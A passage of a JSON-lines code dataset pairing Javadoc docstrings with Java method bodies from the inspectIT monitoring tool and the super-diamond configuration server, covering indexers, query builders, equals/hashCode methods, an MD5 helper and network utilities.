ArrayBasedStorageLeaf<>();\n\t\t\t}\n\t\t} else {\n\t\t\t// for everything else LeafWithNoDescriptors\n\t\t\tif (passId) {\n\t\t\t\treturn new LeafWithNoDescriptors<>(id);\n\t\t\t} else {\n\t\t\t\treturn new LeafWithNoDescriptors<>();\n\t\t\t}\n\t\t}\n\t}\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\indexing\\storage\\impl\\StorageBranchIndexer.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic boolean equals(Object object)", "code": "{\n\tif (this == object) {\n\t\treturn true;\n\t}\n\tif (object == null) {\n\t\treturn false;\n\t}\n\tif (getClass() != object.getClass()) {\n\t\treturn false;\n\t}\n\tif (!super.equals(object)) {\n\t\treturn false;\n\t}\n\tFilteredDeferredClassComposite that = (FilteredDeferredClassComposite) object;\n\treturn Objects.equal(this.sensorTypeEnumToShow, that.sensorTypeEnumToShow);\n}", "path": "inspectit.ui.rcp\\src\\main\\java\\rocks\\inspectit\\ui\\rcp\\model\\FilteredDeferredClassComposite.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * Returns query for invocation overview.\n *\n * @param platformId\n *            Platform ID where to look for the objects. If the zero value is passed, looking\n *            for the object will be done in all platforms.\n * @param invocationIdCollection\n *            Collections of invocations IDs to search.\n * @param limit\n *            The limit/size of the list.\n *\n * @return Returns the query for invocation sequence overview.\n */\n", "func_signal": "public E getInvocationSequences(long platformId, Collection<Long> invocationIdCollection, int limit)", "code": "{\n\tE query = getIndexQueryProvider().getIndexQuery();\n\tquery.setPlatformIdent(platformId);\n\tquery.setObjectClasses(SEARCHED_CLASSES);\n\tquery.addIndexingRestriction(IndexQueryRestrictionFactory.isInCollection(\"id\", invocationIdCollection));\n\treturn query;\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\indexing\\query\\factory\\impl\\InvocationSequenceDataQueryFactory.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic void fetchDeferredChildren(Object object, IElementCollector collector, IProgressMonitor monitor)", "code": "{\n\ttry {\n\t\tList<MethodIdent> methods = getMethods();\n\t\tComposite classComposite = (Composite) object;\n\t\tmonitor.beginTask(\"Loading of Method Elements...\", methods.size());\n\t\tfor (MethodIdent method : methods) {\n\t\t\tfor (MethodIdentToSensorType methodIdentToSensorType : method.getMethodIdentToSensorTypes()) {\n\t\t\t\tif (!isHideInactiveInstrumentations() || methodIdentToSensorType.isActive()) {\n\t\t\t\t\tMethodSensorTypeIdent methodSensorTypeIdent = methodIdentToSensorType.getMethodSensorTypeIdent();\n\t\t\t\t\tString fqn = methodSensorTypeIdent.getFullyQualifiedClassName();\n\t\t\t\t\tSensorTypeEnum sensorTypeEnum = SensorTypeEnum.get(fqn);\n\t\t\t\t\tif (sensorTypeEnum == sensorTypeEnumToShow) { // NOPMD\n\t\t\t\t\t\tif (sensorTypeEnum.isOpenable()) {\n\t\t\t\t\t\t\tComponent targetSensorType = new Leaf();\n\t\t\t\t\t\t\ttargetSensorType.setEnabled(methodIdentToSensorType.isActive());\n\t\t\t\t\t\t\tif (null != method.getParameters()) {\n\t\t\t\t\t\t\t\tString parameters = method.getParameters().toString();\n\t\t\t\t\t\t\t\tparameters = parameters.substring(1, parameters.length() - 1);\n\n\t\t\t\t\t\t\t\ttargetSensorType.setName(String.format(METHOD_FORMAT, method.getMethodName(), parameters));\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\ttargetSensorType.setName(String.format(METHOD_FORMAT, method.getMethodName(), \"\"));\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\ttargetSensorType.setImage(ModifiersImageFactory.getImage(method.getModifiers()));\n\n\t\t\t\t\t\t\tInputDefinition inputDefinition = new InputDefinition();\n\t\t\t\t\t\t\tinputDefinition.setRepositoryDefinition(getRepositoryDefinition());\n\t\t\t\t\t\t\tinputDefinition.setId(sensorTypeEnum);\n\n\t\t\t\t\t\t\tEditorPropertiesData editorPropertiesData = new EditorPropertiesData();\n\t\t\t\t\t\t\teditorPropertiesData.setSensorImage(sensorTypeEnum.getImage());\n\t\t\t\t\t\t\teditorPropertiesData.setSensorName(sensorTypeEnum.getDisplayName());\n\t\t\t\t\t\t\teditorPropertiesData.setViewName(TextFormatter.getMethodString(method));\n\t\t\t\t\t\t\teditorPropertiesData.setViewImage(ModifiersImageFactory.getImage(method.getModifiers()));\n\t\t\t\t\t\t\tinputDefinition.setEditorPropertiesData(editorPropertiesData);\n\n\t\t\t\t\t\t\tIdDefinition idDefinition = new IdDefinition();\n\t\t\t\t\t\t\tidDefinition.setPlatformId(method.getPlatformIdent().getId());\n\t\t\t\t\t\t\tidDefinition.setSensorTypeId(methodSensorTypeIdent.getId());\n\t\t\t\t\t\t\tidDefinition.setMethodId(method.getId());\n\n\t\t\t\t\t\t\tinputDefinition.setIdDefinition(idDefinition);\n\t\t\t\t\t\t\ttargetSensorType.setInputDefinition(inputDefinition);\n\n\t\t\t\t\t\t\tcollector.add(targetSensorType, monitor);\n\t\t\t\t\t\t\tclassComposite.addChild(targetSensorType);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tmonitor.worked(1);\n\t\t\tif (monitor.isCanceled()) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t} finally {\n\t\tmonitor.done();\n\t}\n}", "path": "inspectit.ui.rcp\\src\\main\\java\\rocks\\inspectit\\ui\\rcp\\model\\FilteredDeferredClassComposite.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * Returns query for invocation overview.\n *\n * @param platformId\n *            Platform ID where to look for the objects. If the zero value is passed, looking\n *            for the object will be done in all platforms.\n * @param startDate\n *            Date include invocation from.\n * @param endDate\n *            Date include invocation to.\n * @param minId\n *            The minimum ID for objects to be returned.\n * @param businessTrxId\n *            Business transaction ID. If the zero value is passed, looking for the objects will\n *            be done on all business transactions.\n * @param applicationId\n *            Application ID. If the zero value is passed, looking for the objects will be done\n *            on all applications.\n * @param invocationIdCollection\n *            Collections of invocations IDs to search.\n * @return Returns the query for invocation sequence overview.\n */\n", "func_signal": "public E getInvocationSequences(Long platformId, Date startDate, Date endDate, long minId, int businessTrxId, int applicationId, Collection<Long> invocationIdCollection)", "code": "{\n\tE query = getIndexQueryProvider().getIndexQuery();\n\tquery.setPlatformIdent(platformId);\n\tquery.setMinId(minId);\n\tquery.setObjectClasses(SEARCHED_CLASSES);\n\tif (businessTrxId != 0) {\n\t\tquery.addIndexingRestriction(IndexQueryRestrictionFactory.equal(\"businessTransactionId\", businessTrxId));\n\t}\n\tif (applicationId != 0) {\n\t\tquery.addIndexingRestriction(IndexQueryRestrictionFactory.equal(\"applicationId\", applicationId));\n\t}\n\tif (startDate != null) {\n\t\tquery.setFromDate(new Timestamp(startDate.getTime()));\n\t}\n\tif (endDate != null) {\n\t\tquery.setToDate(new Timestamp(endDate.getTime()));\n\t}\n\tif (invocationIdCollection != null) {\n\t\tquery.addIndexingRestriction(IndexQueryRestrictionFactory.isInCollection(\"id\", invocationIdCollection));\n\t}\n\treturn query;\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\indexing\\query\\factory\\impl\\InvocationSequenceDataQueryFactory.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * Returns query for invocation overview.\n *\n * @param platformId\n *            The ID of the platform/agent.\n * @param methodId\n *            The ID of the method.\n * @param fromDate\n *            Date include invocation from.\n * @param toDate\n *            Date include invocation to.\n *\n * @return Returns the query for invocation sequence overview.\n */\n", "func_signal": "public E getInvocationSequences(long platformId, long methodId, Date fromDate, Date toDate)", "code": "{\n\tE query = getIndexQueryProvider().getIndexQuery();\n\tquery.setPlatformIdent(platformId);\n\tquery.setMethodIdent(methodId);\n\tquery.setObjectClasses(SEARCHED_CLASSES);\n\tif (fromDate != null) {\n\t\tquery.setFromDate(new Timestamp(fromDate.getTime()));\n\t}\n\tif (toDate != null) {\n\t\tquery.setToDate(new Timestamp(toDate.getTime()));\n\t}\n\treturn query;\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\indexing\\query\\factory\\impl\\InvocationSequenceDataQueryFactory.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@SuppressWarnings(\"unchecked\")\n@Override\npublic boolean equals(Object obj)", "code": "{\n\tif (this == obj) {\n\t\treturn true;\n\t}\n\tif (obj == null) {\n\t\treturn false;\n\t}\n\tif (getClass() != obj.getClass()) {\n\t\treturn false;\n\t}\n\tStorageBranchIndexer<E> other = (StorageBranchIndexer<E>) obj;\n\tif (childIndexer == null) {\n\t\tif (other.childIndexer != null) {\n\t\t\treturn false;\n\t\t}\n\t} else if (!childIndexer.equals(other.childIndexer)) {\n\t\treturn false;\n\t}\n\tif (delegateIndexer == null) {\n\t\tif (other.delegateIndexer != null) {\n\t\t\treturn false;\n\t\t}\n\t} else if (!delegateIndexer.equals(other.delegateIndexer)) {\n\t\treturn false;\n\t}\n\treturn true;\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\indexing\\storage\\impl\\StorageBranchIndexer.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * This constructor allows setting of all properties.\n *\n * @param delegateIndexer\n *            Provides delegate indexer with a constructor.\n * @param childIndexer\n *            Provides child indexer.\n * @param id\n *            Id given to this indexer.\n * @param sharedId\n *            If shared ID mode is on. With this mode, all components created with this indexer\n *            will have same ID, thus write will be done in same file.\n */\n", "func_signal": "public StorageBranchIndexer(IBranchIndexer<E> delegateIndexer, StorageBranchIndexer<E> childIndexer, int id, boolean sharedId)", "code": "{\n\tthis.delegateIndexer = delegateIndexer;\n\tthis.childIndexer = childIndexer;\n\tthis.id = id;\n\tthis.passId = sharedId;\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\indexing\\storage\\impl\\StorageBranchIndexer.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * Returns query for searching invocations by trace id.\n *\n * @param traceId\n *            traceId in the span ident\n * @return Returns query for searching invocations by trace id.\n */\n", "func_signal": "public E getInvocationSequences(long traceId)", "code": "{\n\tE query = getIndexQueryProvider().getIndexQuery();\n\tquery.setObjectClasses(SEARCHED_CLASSES);\n\tquery.addIndexingRestriction(IndexQueryRestrictionFactory.isNotNull(\"spanIdent\"));\n\tquery.addIndexingRestriction(IndexQueryRestrictionFactory.equal(\"spanIdent.traceId\", traceId));\n\treturn query;\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\indexing\\query\\factory\\impl\\InvocationSequenceDataQueryFactory.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic int hashCode()", "code": "{\n\tfinal int prime = 31;\n\tint result = 1;\n\tresult = (prime * result) + ((childIndexer == null) ? 0 : childIndexer.hashCode());\n\tresult = (prime * result) + ((delegateIndexer == null) ? 0 : delegateIndexer.hashCode());\n\treturn result;\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\indexing\\storage\\impl\\StorageBranchIndexer.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic IStorageBranchIndexer<E> getNewInstance()", "code": "{\n\tIBranchIndexer<E> branchIndexer = null;\n\tif (sharedInstance()) {\n\t\tbranchIndexer = delegateIndexer;\n\t} else {\n\t\tbranchIndexer = delegateIndexer.getNewInstance();\n\t}\n\n\tStorageBranchIndexer<E> storageBranchIndexer = new StorageBranchIndexer<>(branchIndexer, childIndexer, passId);\n\treturn storageBranchIndexer;\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\indexing\\storage\\impl\\StorageBranchIndexer.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic String toString()", "code": "{\n\tToStringBuilder toStringBuilder = new ToStringBuilder(this);\n\ttoStringBuilder.append(\"id\", id);\n\ttoStringBuilder.append(\"delegateIndexer\", delegateIndexer);\n\ttoStringBuilder.append(\"childIndexer\", childIndexer);\n\ttoStringBuilder.append(\"passId\", passId);\n\treturn toStringBuilder.toString();\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\indexing\\storage\\impl\\StorageBranchIndexer.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * Default constructor.\n */\n", "func_signal": "public NewOrExistsingStorageWizardPage()", "code": "{\n\tsuper(\"Select Storage\");\n\tthis.setTitle(\"Select Storage\");\n\tthis.setMessage(\"Should a new storage should be created, or existing one should be used.\");\n}", "path": "inspectit.ui.rcp\\src\\main\\java\\rocks\\inspectit\\ui\\rcp\\wizard\\page\\NewOrExistsingStorageWizardPage.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic boolean equals(Object object)", "code": "{\n\tif (this == object) {\n\t\treturn true;\n\t}\n\tif (object == null) {\n\t\treturn false;\n\t}\n\tif (getClass() != object.getClass()) {\n\t\treturn false;\n\t}\n\tRegExAggregatedHttpTimerData that = (RegExAggregatedHttpTimerData) object;\n\treturn Objects.equal(this.transformedUri, that.transformedUri) && Objects.equal(this.aggregatedDataList, that.aggregatedDataList);\n}", "path": "inspectit.ui.rcp\\src\\main\\java\\rocks\\inspectit\\ui\\rcp\\util\\data\\RegExAggregatedHttpTimerData.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\nprotected boolean select(MethodIdent methodIdent)", "code": "{\n\tfor (MethodIdentToSensorType methodIdentToSensorType : methodIdent.getMethodIdentToSensorTypes()) {\n\t\tSensorTypeEnum sensorTypeEnum = SensorTypeEnum.get(methodIdentToSensorType.getMethodSensorTypeIdent().getFullyQualifiedClassName());\n\t\tif (ObjectUtils.equals(sensorTypeEnum, sensorTypeEnumToShow)) {\n\t\t\treturn super.select(methodIdent);\n\t\t}\n\t}\n\treturn false;\n}", "path": "inspectit.ui.rcp\\src\\main\\java\\rocks\\inspectit\\ui\\rcp\\model\\FilteredDeferredClassComposite.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * Returns transformed URI.\n *\n * @param object\n *            {@link HttpTimerData}\n * @param httpSensorTypeIdent\n *            Sensor that holds the regEx expression and the template.\n * @return Transformed URI or URI if regular expression is not provided or can not be compiled.\n */\n", "func_signal": "public static String getTransformedUri(HttpTimerData object, MethodSensorTypeIdent httpSensorTypeIdent)", "code": "{\n\ttry {\n\t\tif ((null != httpSensorTypeIdent) && (null != MethodSensorTypeIdentHelper.getRegEx(httpSensorTypeIdent))) {\n\t\t\treturn HttpTimerDataHelper.getTransformedUri(object, MethodSensorTypeIdentHelper.getRegEx(httpSensorTypeIdent), MethodSensorTypeIdentHelper.getRegExTemplate(httpSensorTypeIdent));\n\t\t} else {\n\t\t\treturn object.getHttpInfo().getUri();\n\t\t}\n\t} catch (IllegalArgumentException e) {\n\t\treturn object.getHttpInfo().getUri();\n\t}\n}", "path": "inspectit.ui.rcp\\src\\main\\java\\rocks\\inspectit\\ui\\rcp\\util\\data\\RegExAggregatedHttpTimerData.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic void createControl(Composite parent)", "code": "{\n\tComposite main = new Composite(parent, SWT.NONE);\n\tmain.setLayout(new GridLayout(1, true));\n\n\tnewStorageButton = new Button(main, SWT.RADIO);\n\tnewStorageButton.setText(\"Create new storage\");\n\tnewStorageButton.setSelection(true);\n\n\tnew Button(main, SWT.RADIO).setText(\"Use existing storage\");\n\n\tsetControl(main);\n}", "path": "inspectit.ui.rcp\\src\\main\\java\\rocks\\inspectit\\ui\\rcp\\wizard\\page\\NewOrExistsingStorageWizardPage.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic int hashCode()", "code": "{\n\tfinal int prime = 31;\n\tint result = 1;\n\tresult = (prime * result) + ((bufferNewestElementDate == null) ? 0 : bufferNewestElementDate.hashCode());\n\tresult = (prime * result) + ((bufferOldestElementDate == null) ? 0 : bufferOldestElementDate.hashCode());\n\tresult = (prime * result) + (canWriteMore ? 1231 : 1237);\n\tresult = (prime * result) + (int) (currentBufferSize ^ (currentBufferSize >>> 32));\n\tresult = (prime * result) + ((databaseSize == null) ? 0 : databaseSize.hashCode());\n\tresult = (prime * result) + ((dateStarted == null) ? 0 : dateStarted.hashCode());\n\tresult = (prime * result) + (int) (maxBufferSize ^ (maxBufferSize >>> 32));\n\tresult = (prime * result) + (int) (storageDataSpaceLeft ^ (storageDataSpaceLeft >>> 32));\n\tresult = (prime * result) + (int) (storageMaxDataSpace ^ (storageMaxDataSpace >>> 32));\n\tresult = (prime * result) + (int) (upTime ^ (upTime >>> 32));\n\tresult = (prime * result) + (warnSpaceLeftActive ? 1231 : 1237);\n\treturn result;\n}", "path": "inspectit.shared.all\\src\\main\\java\\rocks\\inspectit\\shared\\all\\communication\\data\\cmr\\CmrStatusData.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic boolean equals(Object obj)", "code": "{\n\tif (this == obj) {\n\t\treturn true;\n\t}\n\tif (obj == null) {\n\t\treturn false;\n\t}\n\tif (getClass() != obj.getClass()) {\n\t\treturn false;\n\t}\n\treturn true;\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\ci\\business\\valuesource\\impl\\MethodSignatureValueSource.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3abytes\n *\n * @param str\n * @return byte[]\n */\n", "func_signal": "public byte[] string2bytes(String str)", "code": "{\n    if (null == str) {\n        throw new NullPointerException(\"\u53c2\u6570\u4e0d\u80fd\u4e3a\u7a7a\");\n    }\n    if (str.length() != 32) {\n        throw new IllegalArgumentException(\"\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u662f32\");\n    }\n    byte[] data = new byte[16];\n    char[] chs = str.toCharArray();\n    for (int i = 0; i < 16; ++i) {\n        int num1 = rDigits.get(chs[i * 2]).intValue();\n        int num2 = rDigits.get(chs[i * 2 + 1]).intValue();\n        data[i] = (byte) ((num1 & 0x0F) << 4 | (num2 & 0x0F));\n    }\n    return data;\n}", "path": "super-diamond-server\\src\\main\\java\\com\\github\\diamond\\utils\\MD5.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * \u904d\u5386\u672c\u5730\u7f51\u5361\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5408\u7406\u7684IP.\n *\n * @return \u672c\u5730\u7f51\u5361IP\n */\n", "func_signal": "public static InetAddress getLocalAddress()", "code": "{\n    if (LOCAL_ADDRESS != null) {\n        return LOCAL_ADDRESS;\n    }\n    InetAddress localAddress = getLocalAddress0();\n    LOCAL_ADDRESS = localAddress;\n    return localAddress;\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\netty\\NetUtils.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * Parses the next property from the input stream and stores the found name\n * and value in internal fields. These fields can be obtained using the\n * provided getter methods. The return value indicates whether EOF was\n * reached (<b>false</b>) or whether further properties are available\n * (<b>true</b>).\n */\n", "func_signal": "public boolean nextProperty() throws IOException", "code": "{\n    String line = readProperty();\n\n    if (line == null) {\n        return false; // EOF\n    }\n\n    parseProperty(line);\n    return true;\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\PropertiesReader.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * Creates a new instance of {@code ConfigurationInterpolator}.\n */\n", "func_signal": "public ConfigurationInterpolator()", "code": "{\n    synchronized (globalLookups) {\n        localLookups = new HashMap<String, StrLookup>(globalLookups);\n    }\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\ConfigurationInterpolator.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * \u521b\u5efa\u7ebf\u7a0b\u6c60.\n *\n * @return\n */\n", "func_signal": "private static QueuedThreadPool creatThreadPool()", "code": "{\n    QueuedThreadPool pool = new QueuedThreadPool();\n    pool.setMaxThreads(maxThreads);\n    pool.setMinThreads(minThreads);\n    pool.setIdleTimeout(60000);\n    pool.setDetailedDump(false);\n    return pool;\n}", "path": "super-diamond-server\\src\\main\\java\\com\\github\\diamond\\jetty\\JettyServer.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * Parses a line read from the properties file. This method is called for\n * each non-comment line read from the source file. Its task is to split the\n * passed in line into the property key and its value. The results of the\n * parse operation can be stored by calling the {@code initPropertyXXX()}\n * methods.\n */\n", "func_signal": "protected void parseProperty(String line)", "code": "{\n    String[] property = doParseProperty(line);\n    initPropertyName(property[0]);\n    initPropertyValue(property[1]);\n    initPropertySeparator(property[2]);\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\PropertiesReader.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * \u5bf9\u5b57\u7b26\u4e32\u8fdb\u884cmd5\n *\n * @param str\n * @return md5 byte[16]\n */\n", "func_signal": "public byte[] hash(String str)", "code": "{\n    opLock.lock();\n    try {\n        byte[] bt = messageDigest.digest(str.getBytes(ENCODE));\n        if (null == bt || bt.length != 16) {\n            throw new IllegalArgumentException(\"md5 need\");\n        }\n        return bt;\n    } catch (UnsupportedEncodingException e) {\n        throw new RuntimeException(\"unsupported utf-8 encoding\", e);\n    } finally {\n        opLock.unlock();\n    }\n}", "path": "super-diamond-server\\src\\main\\java\\com\\github\\diamond\\utils\\MD5.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * Registers the given lookup object for the specified prefix globally. This\n * means that all instances that are created later will use this lookup\n * object for this prefix. If for this prefix a lookup object is already\n * registered, the new lookup object will replace the old one. Note that the\n * lookup objects registered here will be shared between multiple clients.\n * So they should be thread-safe.\n *\n * @param prefix the variable prefix (must not be <b>null</b>)\n * @param lookup the lookup object to be used for this prefix (must not be\n * <b>null</b>)\n */\n", "func_signal": "public static void registerGlobalLookup(String prefix, StrLookup lookup)", "code": "{\n    if (prefix == null) {\n        throw new IllegalArgumentException(\n                \"Prefix for lookup object must not be null!\");\n    }\n    if (lookup == null) {\n        throw new IllegalArgumentException(\n                \"Lookup object must not be null!\");\n    }\n    synchronized (globalLookups) {\n        globalLookups.put(prefix, lookup);\n    }\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\ConfigurationInterpolator.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * Deregisters the global lookup object for the specified prefix. This means\n * that this lookup object won't be available for later created instances\n * any more. For already existing instances this operation does not have any\n * impact.\n *\n * @param prefix the variable prefix\n * @return a flag whether for this prefix a lookup object had been\n * registered\n */\n", "func_signal": "public static boolean deregisterGlobalLookup(String prefix)", "code": "{\n    synchronized (globalLookups) {\n        return globalLookups.remove(prefix) != null;\n    }\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\ConfigurationInterpolator.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * Returns the number of trailing backslashes. This is sometimes needed for\n * the correct handling of escape characters.\n */\n", "func_signal": "private static int countTrailingBs(String line)", "code": "{\n    int bsCount = 0;\n    for (int idx = line.length() - 1; idx >= 0 && line.charAt(idx) == '\\\\'; idx--) {\n        bsCount++;\n    }\n\n    return bsCount;\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\PropertiesReader.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * Obtains the lookup object for the specified prefix. This method is called\n * by the {@code lookup()} method. This implementation will check\n * whether a lookup object is registered for the given prefix. If not, a\n * <b>null</b> lookup object will be returned (never <b>null</b>).\n *\n * @param prefix the prefix\n * @return the lookup object to be used for this prefix\n */\n", "func_signal": "protected StrLookup fetchLookupForPrefix(String prefix)", "code": "{\n    StrLookup lookup = localLookups.get(prefix);\n    if (lookup == null) {\n        lookup = StrLookup.noneLookup();\n    }\n    return lookup;\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\ConfigurationInterpolator.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * Registers the given lookup object for the specified prefix at this\n * instance. From now on this lookup object will be used for variables that\n * have the specified prefix.\n *\n * @param prefix the variable prefix (must not be <b>null</b>)\n * @param lookup the lookup object to be used for this prefix (must not be\n * <b>null</b>)\n */\n", "func_signal": "public void registerLookup(String prefix, StrLookup lookup)", "code": "{\n    if (prefix == null) {\n        throw new IllegalArgumentException(\n                \"Prefix for lookup object must not be null!\");\n    }\n    if (lookup == null) {\n        throw new IllegalArgumentException(\n                \"Lookup object must not be null!\");\n    }\n    localLookups.put(prefix, lookup);\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\ConfigurationInterpolator.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * \u6ce8\u518chook\u7a0b\u5e8f\uff0c\u4fdd\u8bc1\u7ebf\u7a0b\u80fd\u591f\u5b8c\u6574\u6267\u884c\u3002\u4f7f\u7528\uff1akill -15 pid \u5173\u95ed\u8fdb\u7a0b.\n */\n", "func_signal": "private static void addShutdownHook(final Server server)", "code": "{\n    //\u4e3a\u4e86\u4fdd\u8bc1TaskThread\u4e0d\u5728\u4e2d\u9014\u9000\u51fa\uff0c\u6dfb\u52a0ShutdownHook\n    Runtime.getRuntime().addShutdownHook(new Thread() {\n        @Override\n        public void run() {\n            logger.info(\"\u6536\u5230\u5173\u95ed\u4fe1\u53f7\uff0chook\u8d77\u52a8\uff0c\u5f00\u59cb\u68c0\u6d4b\u7ebf\u7a0b\u72b6\u6001 ...\");\n\n            try {\n                server.stop();\n                server.destroy();\n            } catch (Exception e) {\n                logger.error(e.getMessage(), e);\n            }\n\n            System.out.println(\"================\u670d\u52a1\u5668\u505c\u6b62\u6210\u529f================\");\n        }\n    });\n}", "path": "super-diamond-server\\src\\main\\java\\com\\github\\diamond\\jetty\\JettyServer.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * @param hostName .\n * @return ip address or hostName if UnknownHostException \n */\n", "func_signal": "public static String getIpByHost(String hostName)", "code": "{\n    try {\n        return InetAddress.getByName(hostName).getHostAddress();\n    } catch (UnknownHostException e) {\n        return hostName;\n    }\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\netty\\NetUtils.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * @param args\n * @throws ConfigurationException\n */\n", "func_signal": "public static void main(String[] args) throws Exception", "code": "{\n\tPropertiesConfiguration config = new PropertiesConfiguration(\"127.0.0.1\", 8283, \"t_cyservice_performance\", \"development\");\n\tconfig.addConfigurationListener(new ConfigurationListenerTest());\n\tSystem.out.println(config.getString(\"jdbc.url\"));\n\t\n\tSystem.in.read();\n}", "path": "super-diamond-client\\src\\test\\java\\com\\github\\diamond\\client\\Test.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
